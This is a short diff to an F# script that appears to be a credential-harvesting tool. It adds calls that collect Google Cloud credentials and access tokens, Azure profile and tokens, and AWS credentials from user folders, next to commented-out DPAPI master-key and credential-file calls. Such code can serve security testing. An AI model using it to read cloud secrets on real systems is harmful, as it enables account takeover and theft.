@@ -115,3 +115,10 @@ printfn "%A" ie*)
 
 //getDPAPIMasterKeys userfolders |> List.iter (printfn "%A")
 //getCredFiles userfolders |> List.iter (printfn "%A")
+
+getGoogleCloudCreds userfolders |> ignore
+getGoogleCloudCredsL userfolders |> ignore
+getGoogleAccessTokens userfolders |> ignore
+getAzureProfile userfolders |> ignore
+getAzureTokens userfolders |> ignore
+getAWSCreds userfolders |> ignore
